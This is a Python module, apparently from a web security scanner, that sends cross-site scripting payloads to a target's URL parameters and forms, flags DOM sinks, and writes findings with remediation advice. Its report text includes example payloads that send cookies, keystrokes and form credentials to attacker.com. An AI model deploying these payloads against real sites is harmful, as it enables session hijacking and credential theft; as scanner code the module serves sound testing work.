"""
Active XSS (Cross-Site Scripting) Testing Module
Tests for XSS vulnerabilities with real payloads and demonstrates exploitation
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
import html
import re

def test_xss_vulnerabilities(scanner):
    """
    Comprehensive XSS testing with active payloads
    """
    try:
        response = scanner.get_cached_response(scanner.target_url)
        if not response:
            return
        
        # Test URL parameters for reflected XSS
        _test_reflected_xss(scanner)
        
        # Test forms for XSS
        _test_form_xss(scanner, response)
        
        # Test for DOM-based XSS
        _test_dom_xss(scanner, response)
        
        # Test for stored XSS indicators
        _test_stored_xss_indicators(scanner, response)
        
    except Exception as e:
        print(f"XSS testing error: {e}")

def _test_reflected_xss(scanner):
    """Test URL parameters for reflected XSS"""
    parsed = urlparse(scanner.target_url)
    params = parse_qs(parsed.query)
    
    if not params:
        return
    
    # XSS payloads - progressively sophisticated
    payloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '<iframe src="javascript:alert(1)">',
        '<body onload=alert(1)>',
        '<input autofocus onfocus=alert(1)>',
        '"><img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        '<svg><script>alert(1)</script></svg>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '\'><svg onload=alert(document.domain)>',
    ]
    
    for param_name, param_values in params.items():
        for payload in payloads:
            # Create test URL
            test_params = params.copy()
            test_params[param_name] = [payload]
            
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                 parsed.params, new_query, parsed.fragment))
            
            try:
                response = requests.get(test_url, timeout=10, verify=False)
                
                # Check if payload appears in response (unencoded)
                # Look for exact payload or partially unencoded payload
                response_text = response.text
                
                # Check for unencoded dangerous characters
                dangerous_patterns = [
                    payload,  # Exact match
                    payload.replace('<', '&lt;').replace('>', '&gt;'),  # HTML encoded
                ]
                
                # If payload appears unencoded or improperly encoded
                if payload in response_text:
                    # Verify it's actually in executable context
                    soup = BeautifulSoup(response.content, 'html.parser')
                    
                    # Check if it's in script tags, event handlers, or HTML context
                    is_exploitable = (
                        '<script>' in response_text.lower() and payload in response_text or
                        'onerror=' in response_text.lower() and payload in response_text or
                        '<svg' in response_text.lower() and payload in response_text or
                        '<img' in response_text.lower() and payload in response_text
                    )
                    
                    if is_exploitable:
                        # Extract context where payload appears
                        context_match = re.search(f'.{{0,100}}{re.escape(payload)}.{{0,100}}', response_text, re.DOTALL)
                        context = context_match.group(0)[:200] if context_match else "Context not found"
                        
                        scanner.add_finding(
                            severity='HIGH',
                            category='Cross-Site Scripting (XSS)',
                            title=f'Reflected XSS vulnerability in parameter: {param_name}',
                            description=f'**EXPLOITABLE XSS DETECTED**\n\n'
                                      f'Parameter: {param_name}\n'
                                      f'Payload: {payload}\n\n'
                                      f'**Proof of Concept:**\n'
                                      f'```\n{test_url}\n```\n\n'
                                      f'**Context in Response:**\n'
                                      f'```html\n{context}\n```\n\n'
                                      f'**How to Exploit:**\n'
                                      f'1. Send victim this URL: {test_url}\n'
                                      f'2. When clicked, JavaScript executes in victim\'s browser\n'
                                      f'3. Attacker can steal cookies: document.cookie\n'
                                      f'4. Attacker can steal session tokens\n'
                                      f'5. Attacker can redirect to phishing site\n'
                                      f'6. Attacker can perform actions as the victim\n\n'
                                      f'**Advanced Exploitation Examples:**\n'
                                      f'```javascript\n'
                                      f'// Steal cookies:\n'
                                      f'<script>fetch("http://attacker.com/?c="+document.cookie)</script>\n\n'
                                      f'// Keylogger:\n'
                                      f'<script>document.onkeypress=function(e){{fetch("http://attacker.com/?k="+e.key)}}</script>\n\n'
                                      f'// Steal credentials:\n'
                                      f'<script>document.forms[0].onsubmit=function(){{fetch("http://attacker.com/?u="+this[0].value)}}</script>\n'
                                      f'```',
                            url=test_url,
                            remediation='**CRITICAL FIX REQUIRED:**\n'
                                      '1. **Output Encoding:** Encode ALL user input before displaying\n'
                                      '   - HTML context: Use HTML entity encoding\n'
                                      '   - JavaScript context: Use JavaScript encoding\n'
                                      '   - URL context: Use URL encoding\n'
                                      '2. **Content Security Policy (CSP):**\n'
                                      '   ```\n'
                                      '   Content-Security-Policy: default-src \'self\'; script-src \'self\'\n'
                                      '   ```\n'
                                      '3. **Input Validation:** Whitelist allowed characters\n'
                                      '4. **Set HTTPOnly flag on cookies**\n\n'
                                      '**Example Fix (PHP):**\n'
                                      '```php\n'
                                      '// VULNERABLE:\n'
                                      'echo $_GET["name"];\n\n'
                                      '// SECURE:\n'
                                      'echo htmlspecialchars($_GET["name"], ENT_QUOTES, \'UTF-8\');\n'
                                      '```'
                        )
                        return  # Found XSS, stop testing this parameter
                        
            except Exception as e:
                pass

def _test_form_xss(scanner, response):
    """Test form inputs for XSS"""
    soup = BeautifulSoup(response.content, 'html.parser')
    forms = soup.find_all('form')
    
    payload = '<img src=x onerror=alert(1)>'
    
    for form in forms:
        action = form.get('action', '')
        method = str(form.get('method', 'GET')).upper()
        form_url = urljoin(scanner.target_url, action) if action else scanner.target_url
        
        inputs = form.find_all(['input', 'textarea'])
        if not inputs:
            continue
        
        # Build form data
        form_data = {}
        for input_field in inputs:
            name = input_field.get('name')
            if name:
                form_data[name] = 'test'
        
        # Test each field
        for field_name in form_data.keys():
            test_data = form_data.copy()
            test_data[field_name] = payload
            
            try:
                if method == 'POST':
                    test_response = requests.post(form_url, data=test_data, timeout=10, verify=False, allow_redirects=True)
                else:
                    test_response = requests.get(form_url, params=test_data, timeout=10, verify=False)
                
                # Check if payload appears unencoded
                if payload in test_response.text and '<img' in test_response.text:
                    scanner.add_finding(
                        severity='HIGH',
                        category='Cross-Site Scripting (XSS)',
                        title=f'XSS in form field: {field_name}',
                        description=f'**FORM XSS DETECTED**\n\n'
                                  f'Form: {form_url}\n'
                                  f'Vulnerable Field: {field_name}\n'
                                  f'Payload: {payload}\n\n'
                                  f'**How to Exploit:**\n'
                                  f'1. Submit malicious payload in {field_name}\n'
                                  f'2. Execute arbitrary JavaScript\n'
                                  f'3. Could lead to stored XSS if data is persisted',
                        url=form_url,
                        remediation='Encode all form input before displaying in HTML'
                    )
            except:
                pass

def _test_dom_xss(scanner, response):
    """Test for DOM-based XSS vulnerabilities"""
    soup = BeautifulSoup(response.content, 'html.parser')
    scripts = soup.find_all('script')
    
    # Dangerous DOM sinks
    dangerous_patterns = [
        r'document\.write\s*\(',
        r'innerHTML\s*=',
        r'outerHTML\s*=',
        r'document\.location\s*=',
        r'window\.location\s*=',
        r'eval\s*\(',
        r'setTimeout\s*\([^)]*["\']',
        r'setInterval\s*\([^)]*["\']',
        r'document\.URL',
        r'document\.documentURI',
        r'window\.name',
        r'location\.hash',
        r'location\.search',
    ]
    
    for script in scripts:
        if not script.string:
            continue
        
        script_content = script.string
        
        # Check for dangerous patterns with user-controlled sources
        for pattern in dangerous_patterns:
            matches = re.findall(pattern, script_content, re.IGNORECASE)
            if matches:
                # Check if it uses location, document.URL, or other user-controlled sources
                user_controlled_sources = ['location', 'document.URL', 'window.name', 'location.hash', 'document.referrer']
                
                if any(source in script_content for source in user_controlled_sources):
                    context = re.search(f'.{{0,150}}{pattern}.{{0,150}}', script_content, re.DOTALL)
                    context_text = context.group(0) if context else script_content[:200]
                    
                    scanner.add_finding(
                        severity='HIGH',
                        category='Cross-Site Scripting (XSS)',
                        title='Potential DOM-based XSS vulnerability',
                        description=f'**DOM XSS RISK DETECTED**\n\n'
                                  f'Dangerous sink found: {pattern}\n'
                                  f'Uses user-controlled data source\n\n'
                                  f'**Code Context:**\n'
                                  f'```javascript\n{context_text}\n```\n\n'
                                  f'**How to Exploit:**\n'
                                  f'1. Inject payload via URL fragment (#payload)\n'
                                  f'2. Manipulate DOM to execute JavaScript\n'
                                  f'3. Example: site.com/#<img src=x onerror=alert(1)>',
                        url=scanner.target_url,
                        remediation='**Fix DOM XSS:**\n'
                                  '1. Avoid using dangerous sinks (innerHTML, eval, etc.)\n'
                                  '2. Use textContent instead of innerHTML\n'
                                  '3. Sanitize all user input from URL/DOM\n'
                                  '4. Use DOMPurify library for sanitization\n'
                                  '5. Implement CSP with strict-dynamic'
                    )
                    break

def _test_stored_xss_indicators(scanner, response):
    """Check for indicators that stored XSS might be possible"""
    soup = BeautifulSoup(response.content, 'html.parser')
    
    # Look for user-generated content areas
    user_content_indicators = [
        'comment', 'post', 'message', 'review', 'feedback', 
        'testimonial', 'description', 'bio', 'about', 'profile'
    ]
    
    forms = soup.find_all('form')
    for form in forms:
        action = str(form.get('action', '')).lower()
        
        # Check if form likely accepts stored content
        if any(indicator in action for indicator in user_content_indicators):
            textareas = form.find_all('textarea')
            inputs = form.find_all('input', {'type': 'text'})
            
            if textareas or inputs:
                scanner.add_finding(
                    severity='MEDIUM',
                    category='Cross-Site Scripting (XSS)',
                    title='Form may be vulnerable to Stored XSS',
                    description=f'**POTENTIAL STORED XSS**\n\n'
                              f'Form accepts user content: {action}\n'
                              f'If not properly encoded, could lead to Stored XSS\n\n'
                              f'**How Stored XSS Works:**\n'
                              f'1. Attacker submits XSS payload in form\n'
                              f'2. Payload stored in database\n'
                              f'3. When other users view content, payload executes\n'
                              f'4. All viewers are compromised (not just one victim)\n\n'
                              f'**Test Payload:**\n'
                              f'```html\n<script>alert(document.cookie)</script>\n```',
                    url=scanner.target_url,
                    remediation='**CRITICAL:** Always encode user content before displaying:\n'
                              '1. Output encoding for HTML context\n'
                              '2. Store raw data, encode on output\n'
                              '3. Implement CSP headers\n'
                              '4. Regular security audits of user-generated content'
                )
